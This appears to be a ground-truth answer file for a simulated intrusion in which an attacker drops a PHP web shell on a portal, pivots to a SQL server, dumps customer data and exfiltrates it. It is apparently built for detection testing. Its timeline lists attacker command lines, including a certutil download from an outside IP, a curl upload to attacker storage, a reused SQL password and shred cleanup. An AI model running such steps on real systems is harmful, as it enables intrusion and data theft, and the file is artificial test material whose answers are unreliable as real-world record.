# Ground Truth: calloway-php2shell

**Scenario:** A threat actor exploits two (scenario-defined) PHP handler flaws, CVE-2026-109618 and CVE-2026-109619, to drop the php2shell web shell on the IIS customer portal (WEB01). They run local and network reconnaissance, pivot through the portal's over-privileged SQL login to DB01, locate and dump sensitive customer and pricing data, stage it on the Linux backup host (BKP01), and exfiltrate it over HTTPS from that host.

**Generated:** 2026-10-19 05:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **svc-portal** on **WEB01**: Attacker fingerprints the customer portal and probes the import module
2. **svc-portal** on **WEB01**: CVE-2026-109618 unauthenticated upload writes the php2shell web shell as thumb_cache.php
3. **svc-portal** on **WEB01**: CVE-2026-109619 handler executes the shell; first command confirms identity
4. **svc-portal** on **WEB01**: System and network configuration discovery
5. **svc-portal** on **WEB01**: Local accounts, administrators group, running services
6. **svc-portal** on **WEB01**: Active connections, ARP cache and routing table
7. **svc-portal** on **WEB01**: Search the portal tree for configuration files
8. **svc-portal** on **WEB01**: Read the portal database configuration; the app uses an over-privileged SQL login
9. **svc-portal** on **WEB01**: Domain controller, trust and privileged group discovery
10. **svc-portal** on **WEB01**: PowerShell-driven sweep of the server segment for SMB, RDP, WinRM, SSH and SQL
11. **svc-portal** on **WEB01**: Attempt to pull a helper binary from attacker infrastructure over HTTP; blocked by the DMZ egress policy
12. **svc-portal** on **WEB01**: Enumerate service principal names to locate database and file servers
13. **svc-portal** on **WEB01**: Log into DB01 with the harvested portal SQL login and enable xp_cmdshell
14. **svc-sql** on **DB01**: First xp_cmdshell command on DB01 confirms execution as the SQL service account
15. **svc-sql** on **DB01**: List databases and data directories to find where business data lives
16. **svc-sql** on **DB01**: Browse ERP schema for customer account, banking and pricing tables
17. **svc-sql** on **DB01**: Bulk export of customer account and contract pricing tables with bcp
18. **svc-sql** on **DB01**: Compress the exports into a single archive
19. **svc-sql** on **DB01**: Copy the archive to the backup host using the nightly backup job's SSH identity
20. **svc-backup** on **BKP01**: Interactive session on BKP01 to verify the staged archive and check egress
21. **svc-backup** on **BKP01**: Upload the staged archive to attacker-controlled storage over HTTPS
22. **svc-backup** on **BKP01**: Remove the staged archive
23. **svc-sql** on **DB01**: Delete exports and archive from DB01
24. **svc-portal** on **WEB01**: Disable xp_cmdshell again to reduce visibility


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2026-10-20 07:40:01 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: C3y8tFE9bglMzOPSPY) |
| 2026-10-20 07:40:03 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CESud5RcAta0ES0LgUp) |
| 2026-10-20 07:51:50 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CpFegULN4fWuy8FwG9) [IDS: SID 2012647 policy=every candidates=1 emitted=1 filtered=0] |
| 2026-10-20 07:56:28 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CMHIspWhItlmCXCokI) |
| 2026-10-20 07:56:30 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\php-cgi.exe (PID: 14616) - `C:\Windows\System32\php-cgi.exe` |
| 2026-10-20 07:56:31 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 14652) - `cmd.exe /c whoami /all` |
| 2026-10-20 08:03:33 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: Cb0w5wjtYUuIg87deJd) |
| 2026-10-20 08:03:35 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 14956) - `cmd.exe /c "hostname & systeminfo & ipconfig /all"` |
| 2026-10-20 08:12:57 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CgWd6uhjqawZNCEh4j) |
| 2026-10-20 08:12:59 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 14964) - `cmd.exe /c "net user & net localgroup administr...` |
| 2026-10-20 08:23:41 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CuDK7QjUM2VtUNp9fh) |
| 2026-10-20 08:23:42 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 14996) - `cmd.exe /c "netstat -ano & arp -a & route print"` |
| 2026-10-20 08:38:07 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CUom9mNvSDNWHWHgp) |
| 2026-10-20 08:38:08 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 15004) - `cmd.exe /c dir /s /b C:\inetpub\wwwroot\portal\...` |
| 2026-10-20 08:45:55 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CwmQk7V9S8qWaYFPqr) |
| 2026-10-20 08:45:57 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 15016) - `cmd.exe /c type C:\inetpub\wwwroot\portal\inclu...` |
| 2026-10-20 09:17:52 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: C1AjbnCkmslAU0tqzkS) |
| 2026-10-20 09:17:55 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 15196) - `cmd.exe /c "nltest /dclist:calloway.local & nlt...` |
| 2026-10-20 09:40:46 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CXDp9hkwECXMiUzANh) |
| 2026-10-20 09:40:49 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 15200) - `powershell.exe -NoProfile -NonInteractive -Comm...` |
| 2026-10-20 09:40:58 UTC | svc-portal | WEB01 | Port_Scan | Port scan: 60 targets, ports [22, 135, 445, 1433, 3389, 5985], 360 denied connections + ASA threat detection alert (733100) |
| 2026-10-20 10:12:23 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: Cs99O1dbld2Owhvch) |
| 2026-10-20 10:12:25 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\certutil.exe (PID: 15476) - `certutil.exe -urlcache -split -f http://45.83.6...` |
| 2026-10-20 10:26:07 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CXKaANQcG6CeQOpCH1D) |
| 2026-10-20 10:26:08 UTC | svc-portal | WEB01 | Process | Process: C:\Windows\System32\setspn.exe (PID: 15480) - `setspn.exe -T calloway.local -Q MSSQLSvc/*` |
| 2026-10-20 10:51:59 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: C5inewwXXePPhdSH1r) |
| 2026-10-20 10:52:00 UTC | svc-portal | WEB01 | Process | Process: C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe (PID: 15508) - `sqlcmd.exe -S DB01 -U portal_app -P Prt#2026db ...` |
| 2026-10-20 11:03:46 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 17928) - `cmd.exe /c "whoami & hostname & ipconfig /all"` |
| 2026-10-20 11:21:37 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 17976) - `cmd.exe /c "sqlcmd -E -Q \"SELECT name,create_d...` |
| 2026-10-20 11:50:39 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 17984) - `cmd.exe /c sqlcmd -E -d ERP -Q "SELECT TABLE_SC...` |
| 2026-10-20 11:50:50 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 18036) - `cmd.exe /c sqlcmd -E -d ERP -Q "SELECT TOP 5 * ...` |
| 2026-10-20 12:23:47 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 18328) - `cmd.exe /c bcp "SELECT * FROM ERP.dbo.CustomerA...` |
| 2026-10-20 12:23:48 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 18332) - `cmd.exe /c bcp "SELECT * FROM ERP.dbo.ContractP...` |
| 2026-10-20 12:51:49 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 18348) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2026-10-20 13:14:27 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\scp.exe (PID: 18676) - `scp.exe -i C:\ProgramData\SQLBackup\id_ed25519 ...` |
| 2026-10-20 13:31:05 UTC | svc-backup | BKP01 | Ssh_Session | SSH session to 10.10.20.50:22 (UID: Cjgi5UtO4RdObFe0Ub) |
| 2026-10-20 13:31:09 UTC | svc-backup | BKP01 | Process | Process: /usr/bin/ls (PID: 1700019) - `ls -la /var/backups/db/` |
| 2026-10-20 13:31:14 UTC | svc-backup | BKP01 | Process | Process: /usr/bin/df (PID: 1700027) - `df -h /var/backups` |
| 2026-10-20 13:31:18 UTC | svc-backup | BKP01 | Process | Process: /usr/bin/curl (PID: 1700033) - `curl -sS -m 5 -I https://static.cloudmetric-cdn...` |
| 2026-10-20 13:31:48 UTC | svc-backup | BKP01 | Connection | Connection to 5.188.206.34:443 (UID: C76mWomhY2OVcUWdw) |
| 2026-10-20 14:11:59 UTC | svc-backup | BKP01 | Process | Process: /usr/bin/curl (PID: 1708206) - `curl -sS -T /var/backups/db/sqlmaint.zip https:...` |
| 2026-10-20 14:12:20 UTC | svc-backup | BKP01 | Connection | Connection to 5.188.206.34:443 (UID: C7WPi0aiGhzEGomweVC) |
| 2026-10-20 14:40:58 UTC | svc-backup | BKP01 | Process | Process: /usr/bin/shred (PID: 1717582) - `shred -u /var/backups/db/sqlmaint.zip` |
| 2026-10-20 14:47:26 UTC | svc-sql | DB01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 18980) - `cmd.exe /c del /f /q C:\Windows\Temp\ca.dat C:\...` |
| 2026-10-20 14:57:56 UTC | svc-portal | WEB01 | Connection | Connection to 203.0.113.10:80 (UID: CJcAMD83ZtzC9AdFFi0) |
| 2026-10-20 14:57:58 UTC | svc-portal | WEB01 | Process | Process: C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe (PID: 16632) - `sqlcmd.exe -S DB01 -U portal_app -P Prt#2026db ...` |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 001c53d0-ed99-4697-85aa-d747b64870af | ids | visible: 1 |
| 00952bdc-4c7e-45cf-b491-236e56fffa26 | ids | filtered: 1 |
| 01f770c1-0dd5-4162-9245-18bc39954ed1 | ids | visible: 1 |
| 032b6685-04bf-4dca-aac3-2e30781dc099 | ids | visible: 1 |
| 03377139-34ba-470c-969f-0e3af9ed50ad | ids | visible: 1 |
| 033bdb75-2233-4b8d-9658-c8ab2a75cc9d | ids | visible: 1 |
| 03acb878-4570-4b8f-a078-9de50bde96b0 | ids | visible: 1 |
| 03cf11b0-6314-4007-8ff8-7ff2b9da1e67 | ids | visible: 1 |
| 03e2e58d-713e-412c-a21e-c21122a56531 | ids | visible: 1 |
| 0444843e-5707-437a-9362-4a68397544cc | ids | visible: 1 |
| 046215d9-5ea8-46ed-936e-9875688a00bd | ids | visible: 1 |
| 04b0d650-cf4c-4789-9d87-409020263e14 | ids | visible: 1 |
| 04f7db65-2fdb-4421-949f-2a169708bc21 | ids | visible: 1 |
| 05162ff3-d9f0-48ac-91c9-0f5b910cee08 | ids | visible: 1 |
| 0563d204-49b2-495c-b4f1-70b8d6eacce2 | ids | visible: 1 |
| 0659ef2a-8276-4cfd-aeb9-b19035e8a969 | ids | visible: 1 |
| 066ac51d-c09c-4b34-9a07-26a9e9e581b4 | ids | visible: 1 |
| 06f331f5-6d56-463a-b76f-a4b74d63b5d8 | ids | visible: 1 |
| 0793befe-5935-48a9-9b2e-c70cfb26e820 | ids | visible: 1 |
| 079ae297-0883-40a9-a1cb-a277752c5ae0 | ids | visible: 1 |
| 07ac60c8-94cf-404e-abb1-750099834f34 | ids | visible: 1 |
| 08971c23-1328-4c83-b36e-2e936648ae02 | ids | visible: 1 |
| 08b6fe73-8136-4a36-a2bd-c773b39861e1 | ids | visible: 1 |
| 090fca77-d30a-4a04-95f5-98f0a9e3938c | ids | visible: 1 |
| 0a7dfc0f-3edc-4bea-9de8-5f8fff672f3b | ids | visible: 1 |
| 0aaf5051-ffb2-45b5-bf72-762c512dcabd | ids | visible: 1 |
| 0acdc700-c50f-401e-80e7-00a7c328f61e | ids | visible: 1 |
| 0b21a68f-0126-4cb8-9d0e-70ed876fe712 | ids | visible: 1 |
| 0b847c1d-826e-47f5-b8c0-d32b0e5b9599 | ids | visible: 1 |
| 0da50894-7163-4fc3-9896-0ada80019bd2 | ids | visible: 1 |
| 0dfd4a93-eca1-4059-bb0d-4481d073e3d6 | ids | visible: 1 |
| 0ea6e8ab-b3ba-4f64-ab34-c8db1c2f07fa | ids | visible: 1 |
| 0ecaf531-6b19-4455-8ffb-f0116e126c4c | ids | visible: 1 |
| 0f2f8865-a8d0-42b3-86a3-51f815ddd0ac | ids | visible: 1 |
| 0f6df2d6-6e33-45a4-8785-e1cfb453e979 | ids | visible: 1 |
| 0faebe48-bc5f-4a93-a67e-6090658f8b6f | ids | visible: 1 |
| 106577b7-792a-4ace-bb1c-614dfe2a5bf3 | ids | visible: 1 |
| 10855442-de1c-406f-86ca-7d2fb83e1079 | ids | visible: 1 |
| 108bb30b-3ca1-4cfa-9e3d-1395cfc2aae3 | ids | visible: 1 |
| 110541d2-29e6-45a7-a0b2-e569bab4a5c3 | ids | visible: 1 |
| 1110f6cc-1c55-46af-9990-03fb16b47de6 | ids | visible: 1 |
| 114855e8-890e-461c-8e28-75db4884811d | ids | visible: 1 |
| 1154ca4a-b2cf-485a-9b46-4c15f1f0fd84 | ids | visible: 1 |
| 1161d0bd-81dc-4c44-aba2-01de690f43a0 | ids | visible: 1 |
| 1162f495-74ad-4c5b-9451-44191afd54db | ids | visible: 1 |
| 124e1f70-6942-4539-b000-ebc04e2f8477 | ids | visible: 1 |
| 1309c541-67eb-4a83-b02b-51107deea329 | ids | visible: 1 |
| 13bfe947-8e5b-4eb5-9334-3a1cd4a5a678 | ids | visible: 1 |
| 1486b797-8e3c-42e8-ac26-90c2def5d073 | ids | visible: 1 |
| 15917916-65c8-495f-941e-cee380d582fe | ids | visible: 1 |
| 15a83c0a-854c-461d-a6ed-9fa06a7faea7 | ids | visible: 1 |
| 167bf863-c1c7-45e3-9d11-f27253c9158d | ids | visible: 1 |
| 16828ba8-834b-4506-8b8b-ed4784983420 | ids | visible: 1 |
| 17883adf-ae82-4219-9ba9-79f6ee60df3a | ids | visible: 1 |
| 1793966a-e3c8-4dea-baa1-73011ed456de | ids | visible: 1 |
| 17bffc61-1966-4fae-b294-ccd4cba27b27 | ids | visible: 1 |
| 18318418-dd99-49f9-a7d3-01aa22f0af12 | ids | visible: 1 |
| 185a3949-86ca-4928-bb0a-895eefdd50d5 | ids | visible: 1 |
| 18b70205-bba8-4ba1-87ae-2f7cea8d26ef | ids | visible: 1 |
| 19409eeb-b35d-47d5-9707-60cc34c03ef1 | ids | visible: 1 |
| 1a1c9da2-604d-44d3-9842-8eb77883453a | ids | visible: 1 |
| 1a200436-3508-4bc8-842c-64984c28d333 | ids | visible: 1 |
| 1ab9efa6-b004-4bf4-959c-e1c08cb34522 | ids | filtered: 1 |
| 1acc63bd-7397-475f-832a-a351579f3452 | ids | visible: 1 |
| 1afeeafa-aafb-438e-b721-4d560dca0bdc | ids | visible: 1 |
| 1b372a13-6fab-4040-86d3-a0ea8b09fbf9 | ids | visible: 1 |
| 1c06f214-acd2-4073-a329-dce75b5f246a | ids | visible: 1 |
| 1c763e76-f4a7-4995-b5d1-1b6c286ab8b7 | ids | visible: 1 |
| 1d0a9149-b5a0-4bc9-a2b4-c7ac5d2a8a95 | ids | visible: 1 |
| 1d234987-a21b-4ef3-8c2b-430b3c9a83a8 | ids | visible: 1 |
| 1d81d4b5-6fd6-41d1-9278-f223c315eaeb | ids | visible: 1 |
| 1d9eab76-3196-4426-884e-1b95ed0c7427 | ids | visible: 1 |
| 1df7fa1f-f230-4b7d-9299-c2529d162279 | ids | visible: 1 |
| 1e35db75-0ee2-41f2-948c-24f779a0d8c0 | ids | visible: 1 |
| 1e37933e-924c-4912-819c-cf2987652872 | ids | visible: 1 |
| 1ebccc64-a788-4248-bd6d-9d8839e071a9 | ids | visible: 1 |
| 1f2f2a77-f229-4dc7-a553-cd56d88d4516 | ids | visible: 1 |
| 1f551b19-3c71-44b4-bde4-37c13a15727b | ids | visible: 1 |
| 1f6a1830-237a-4c6d-9946-69a846ae9a95 | ids | visible: 1 |
| 1f7fcc94-e9ee-4edc-8ec7-33cdddeeeae9 | ids | visible: 1 |
| 20ac3a96-f708-43cd-8a1f-b58917844430 | ids | visible: 1 |
| 20eabdfe-30d5-4907-8cb1-df00014f3faf | ids | visible: 1 |
| 215201cc-7947-4897-8c0b-330528d13ed0 | ids | visible: 1 |
| 21d9e749-152e-48db-958f-8260389c32fc | ids | visible: 1 |
| 21ec4439-8993-4a0b-b853-111ff9aefc03 | ids | visible: 1 |
| 220d7dd4-4b60-43a4-9873-490440b1b656 | ids | visible: 1 |
| 225358dd-7341-4409-9a54-aed6779936fe | ids | visible: 1 |
| 2264428a-28ea-4de3-8b6a-6b997caea532 | ids | visible: 1 |
| 22ba6003-2469-4e13-9165-b9a47433d6b4 | ids | visible: 1 |
| 2386787a-40c3-4046-88fc-f4e56cb6e941 | ids | visible: 1 |
| 2425c870-6080-4e7b-9b98-dc8f39eae928 | ids | visible: 1 |
| 253abbba-1e2b-41cb-902e-8be8d4a26dda | ids | visible: 1 |
| 254fca2c-52d5-4106-94cf-d7aeebc425fe | ids | visible: 1 |
| 26830056-b7cc-4302-aa0b-e86f26dfd978 | ids | visible: 1 |
| 26a43717-3dc2-4495-a89b-4715d09f7191 | ids | visible: 1 |
| 27f0e4b8-fcd3-462f-9d51-ca896fd93144 | ids | visible: 1 |
| 27fe366c-dbe7-4315-ac24-353516004293 | ids | filtered: 1 |
| 284e9605-a66c-4027-a7c8-e7e6045517fb | ids | visible: 1 |
| 28a982e6-17ab-4f68-bd2b-bf625577b9d8 | ids | visible: 1 |
| 299aeb97-5ab8-4556-a6e0-fe2fada961d8 | ids | visible: 1 |
| 29b5ffa8-acb3-4b7f-94cd-665e00426a7f | ids | visible: 1 |
| 29e7e21c-a1d3-4716-ad7f-ababa828dde1 | ids | visible: 1 |
| 2a66ed4d-9c36-43e9-af01-75855096ffbf | ids | visible: 1 |
| 2ae33ed1-511b-4096-bb2c-12bfe1f23898 | ids | visible: 1 |
| 2b1113a9-9b1e-42b1-8b7a-48aeb04e10cf | ids | visible: 1 |
| 2c37ede5-c6a7-4e2e-9708-142b3b2cbff7 | ids | visible: 1 |
| 2c3a29f5-1c25-49d1-906d-d4f5e86142d4 | ids | visible: 1 |
| 2c5fb74e-663a-4b2d-97c7-664558cc0f06 | ids | visible: 1 |
| 2d0d893e-1b9f-4295-b0b3-bd361f09f679 | ids | visible: 1 |
| 2d3483f7-7993-4793-8f63-0ca0b27b20c9 | ids | visible: 1 |
| 2d969a4c-ab22-4a48-af12-3dd39433c687 | ids | visible: 1 |
| 2dbd445e-5bcb-4413-94e6-3324011653c2 | ids | visible: 1 |
| 2e15fd32-54ff-4f24-9cc7-446b1130a0e8 | ids | visible: 1 |
| 2e231d21-de07-4a08-b718-abfbc806a049 | ids | visible: 1 |
| 2e68a985-21ae-44a1-82d7-7807a62efd91 | ids | visible: 1 |
| 2ed8c50e-26a1-4fc3-b830-84741aa7274e | ids | visible: 1 |
| 2eda7739-bc1b-4eed-840a-fa14734b37f9 | ids | visible: 1 |
| 2fa3424a-b496-4a02-9356-fff9a64af2fd | ids | visible: 1 |
| 2fc7cb29-42c3-42a4-8165-e3e2c88e6641 | ids | visible: 1 |
| 305badde-9e89-428c-a9ea-c9004c4de1bf | ids | visible: 1 |
| 30e6da3a-a202-4555-9072-09fbfe786d35 | ids | visible: 1 |
| 31b3616a-f419-4a83-ac6c-3181b59df6c5 | ids | visible: 1 |
| 31ff0a9e-44b9-4e15-91cf-5aea5dd7abdb | ids | visible: 1 |
| 3304bcfd-dbc9-4e0d-972f-113e04d96dd5 | ids | visible: 1 |
| 330abc1d-0e1b-4dcb-bdec-5194a7a6f3dd | ids | visible: 1 |
| 3506bca8-520f-46ba-9a2c-a0be31243b95 | ids | visible: 1 |
| 35084b74-628f-4d28-9300-7cad9bd83b48 | ids | filtered: 1 |
| 35a769f9-a9d5-4bd2-a85f-763e9a2e2ee7 | ids | visible: 1 |
| 35dc609a-438c-4ec2-8a95-271987c939cb | ids | visible: 1 |
| 3667d860-9e75-4eba-b34d-de258c5a131c | ids | visible: 1 |
| 372adbb5-6a28-4eca-817f-dd551aeb5b8f | ids | visible: 1 |
| 3741208b-52e1-4224-b6b1-1678c731d817 | ids | visible: 1 |
| 37940eb1-7dd4-4b48-b9d5-dbd08bd18155 | ids | visible: 1 |
| 37b18959-08b2-4807-8740-e1639d94997f | ids | visible: 1 |
| 37d2f605-4375-451c-9808-54e05f1c38ac | ids | visible: 1 |
| 37f89119-1149-40fa-831b-6731d777cf2a | ids | visible: 1 |
| 3862ba2a-b187-43e7-b1be-fbacd6e83094 | ids | visible: 1 |
| 392bdcd6-6c85-4a44-a535-e2b09c0f0a3a | ids | visible: 1 |
| 3939d2ce-1162-4d93-9f39-d452c705a67c | ids | visible: 1 |
| 39784e1f-9e33-4d1c-9d25-cc0eb2958b71 | ids | visible: 1 |
| 399fa300-44f1-4239-9de3-7766c4fe45aa | ids | visible: 1 |
| 3a2d4dff-c3e1-4dcb-943c-22eb60000ace | ids | visible: 1 |
| 3a9c4183-4dfc-45d1-a92a-d227f47e099b | ids | visible: 1 |
| 3b24d267-69d7-431e-8181-14a607d204b2 | ids | visible: 1 |
| 3bb32f59-c9dc-4c5a-b82e-85392dff23d4 | ids | visible: 1 |
| 3bf757b9-697f-4d5c-be40-5c628988e129 | ids | visible: 1 |
| 3c2fc969-aa33-4c0e-ac67-8c357066b608 | ids | visible: 1 |
| 3d09bd93-d259-43d6-ba46-e7dddf070a5b | ids | visible: 1 |
| 3d77bc2c-9d37-4136-a6ef-bdd0fd32ad3b | ids | visible: 1 |
| 3d84226e-33cd-4ea5-89f6-28f66d09de38 | ids | visible: 1 |
| 3d9ca4f3-5eb0-4bfc-92c8-8fe848dc8917 | ids | visible: 1 |
| 3daa9694-62f6-4e1d-8996-b8d03c2565d4 | ids | visible: 1 |
| 3dc4cd24-d004-4e96-948e-a158b2fafe31 | ids | visible: 1 |
| 3e654b71-3cd1-46f7-bea5-90ac61729779 | ids | visible: 1 |
| 4091050c-b051-40bd-b553-fbd80aac5db3 | ids | visible: 1 |
| 40d7365d-1ad5-400e-9168-4f6c8269ca04 | ids | visible: 1 |
| 420688c1-bc47-4907-a667-1254c1685c24 | ids | visible: 1 |
| 425f86cc-9906-4b34-9d5b-4d9d6b77352b | ids | visible: 1 |
| 426eebcc-4221-4e48-9c4d-dc8939c65848 | ids | visible: 1 |
| 429a14de-7fab-404e-a2c0-7a22154a6edc | ids | visible: 1 |
| 42c6c504-f771-48a7-a680-910c6d89626f | ids | visible: 1 |
| 43266c5b-424b-404c-83d3-a468f647b36d | ids | visible: 1 |
| 436a0bc9-7812-404f-9974-a00563c9f87d | ids | visible: 1 |
| 43867416-40fb-4c96-ab45-f9c57d8ec190 | ids | visible: 1 |
| 43bf57e0-152f-4b2f-8b66-c225519fa6cc | ids | visible: 1 |
| 4436d18b-c1d0-4d14-a8dd-94ae287d836c | ids | visible: 1 |
| 444c6e68-c27b-4233-944b-a08736b6ac20 | ids | visible: 1 |
| 44a0635a-0fb2-4b70-aa06-3aa830062bcd | ids | visible: 1 |
| 44ea8bcb-ae72-48e6-9fe9-7dd791161aac | ids | visible: 1 |
| 4566afcc-5412-449b-87a8-6a793b6bc1b2 | ids | visible: 1 |
| 45a0c2d3-0e7d-43db-ab02-170a3599013b | ids | visible: 1 |
| 45be7522-b49b-41a7-a81c-3bf1653e752c | ids | visible: 1 |
| 45c2c355-928d-4362-8eaf-67d4337c3ee8 | ids | visible: 1 |
| 45e0970a-d6a5-4a1b-93a3-14d6febe7068 | ids | visible: 1 |
| 46e61da5-aac2-4e68-b118-0f654584e129 | ids | filtered: 1 |
| 48225a89-85dc-4d6b-93bf-4830ff84afe2 | ids | visible: 1 |
| 482e68b0-15e9-4b08-8796-f004ba7259e9 | ids | visible: 1 |
| 48d37edd-f24b-4329-b1fe-e3819cca4d4a | ids | visible: 1 |
| 4927927b-bbcb-4f07-bcf9-f66b514586b6 | ids | visible: 1 |
| 4964e0d1-c7f0-4814-aaee-562a76df31bd | ids | filtered: 1 |
| 49e8510d-bb5b-445a-8ad9-4e7702dbb4f1 | ids | visible: 1 |
| 4b5ebf81-d20e-47cc-9471-5c0c82ce0617 | ids | visible: 1 |
| 4b5fe599-7b45-41eb-9407-16f38084c6bf | ids | visible: 1 |
| 4c141749-0472-4881-bc97-adbf5ee6de51 | ids | visible: 1 |
| 4c4cf092-2c5e-4e55-b62c-4c27490bbb77 | ids | visible: 1 |
| 4c5dfaf4-2980-42b1-96dc-f778eef3176c | ids | visible: 1 |
| 4c72ac52-5a09-471c-9ffe-9a18021fca29 | ids | visible: 1 |
| 4cfd3eed-c770-41cf-a1a7-c667d6e56b08 | ids | visible: 1 |
| 4e2f955b-11da-4d7f-9370-cb3e0fd231a8 | ids | visible: 1 |
| 4e4ff3a4-f7a8-4582-aea7-a694979ed407 | ids | visible: 1 |
| 4e6157a7-a93b-4bd7-a59a-aff14aba9da3 | ids | visible: 1 |
| 4e9b0c53-829b-4619-b932-d4905d1d420a | ids | visible: 1 |
| 4ebdde66-951e-4ef9-b0a5-fd27662bf160 | ids | visible: 1 |
| 4f05ba51-b4c7-4e41-9806-668ea285bb6a | ids | visible: 1 |
| 4fc76c47-3da2-4481-9b69-31362c26841e | ids | visible: 1 |
| 5019f00e-513e-46d9-b687-9f345c2aa864 | ids | visible: 1 |
| 50856410-f9b2-4dab-81d8-09b7aa25d2c1 | ids | visible: 1 |
| 50ba1df4-3739-47a8-9348-c6c88fbb93b3 | ids | visible: 1 |
| 50bda877-a897-4a89-8691-5d5ceb52345d | ids | visible: 1 |
| 50d498db-675b-467f-a85c-9fba4bed1e4d | ids | visible: 1 |
| 510cbf20-ca54-48ea-b505-da08ef200e46 | ids | visible: 1 |
| 514db64b-a85e-4c7a-9ff6-cdd91a6e219e | ids | visible: 1 |
| 51676e78-2b05-4405-acd4-15ae46fb284a | ids | visible: 1 |
| 52427cb2-bf2b-4b41-a552-9088eb990715 | ids | visible: 1 |
| 52b322d3-2a69-4461-a827-7199b8eb7c9e | ids | visible: 1 |
| 534d41d7-93e2-403d-b73d-651dbef34271 | ids | filtered: 1 |
| 5378a673-f18b-4ef1-ab5f-06c60fbb0b11 | ids | visible: 1 |
| 53a13009-4f0e-4b69-9c2a-36ec3650ae20 | ids | visible: 1 |
| 53beb9de-8900-4e79-ae66-b662f09f4c33 | ids | visible: 1 |
| 5468efe4-c41c-4074-8c56-33e19ce296a3 | ids | visible: 1 |
| 54ba7d13-122c-4243-88c0-62650c351e35 | ids | visible: 1 |
| 5506c269-afcb-4a87-b56c-8552faf15a10 | ids | visible: 1 |
| 551278c2-ae21-4a8d-8920-5db46decf31e | ids | visible: 1 |
| 55e5939d-3edd-4dba-a578-5b9b58bae5e8 | ids | visible: 1 |
| 560f2000-c3d5-44f7-b033-9e4497f2724b | ids | visible: 1 |
| 56120256-1e92-4dcc-a1a8-bf0efda439b8 | ids | visible: 1 |
| 56a788b8-a876-4dfd-ac02-d6cf0ea834d9 | ids | visible: 1 |
| 56dff7f0-58c3-4bf5-900e-c34c511a0a92 | ids | visible: 1 |
| 57bbb374-cb15-4c45-b7a9-33504a5bdf93 | ids | visible: 1 |
| 57df6e90-1793-4811-b26a-6eddbab8e410 | ids | visible: 1 |
| 5876e94a-603a-4d04-ac10-babaf50f03ab | ids | visible: 1 |
| 58c9fdc3-9394-4982-9db1-19a8239ad5a2 | ids | filtered: 1 |
| 592e90e9-8cb8-4fc0-86ec-bf6f206d5405 | ids | visible: 1 |
| 594ef950-703b-459c-aa51-0da68175917f | ids | visible: 1 |
| 59841af6-874d-42ea-bb6b-224cea919e3b | ids | visible: 1 |
| 5ba8753d-755a-48af-ad7c-dc971cc41c81 | ids | filtered: 1 |
| 5bb0d1cc-ed4f-45ba-b6e3-54a27e68a6bc | ids | visible: 1 |
| 5e7921f4-bd41-4c5d-a9cc-3c5fe2d79ba4 | ids | visible: 1 |
| 5e92f6e9-3c8a-4972-b936-7a740e8e56ad | ids | visible: 1 |
| 5ecc9d4d-eda3-4a21-a17e-77422fcd8d15 | ids | visible: 1 |
| 5f080af8-11cf-4aac-a173-678b20500784 | ids | visible: 1 |
| 5f1c2d5a-f00d-41a3-8988-b612c9b80b23 | ids | visible: 1 |
| 5f96d0f9-a606-4331-b54d-67c2f8497a7c | ids | visible: 1 |
| 5fab109b-7035-4838-9575-918014a069d9 | ids | visible: 1 |
| 5fd5bc67-1f15-4549-b5b5-447bba8f248f | ids | visible: 1 |
| 5fead44d-a3c8-460a-81f3-3d9177453cbf | ids | visible: 1 |
| 5ffe6eac-1dae-44f6-9e59-5b685ad300ab | ids | filtered: 1 |
| 604e66d7-ecbd-4aa9-a7dc-20aac3dad530 | ids | visible: 1 |
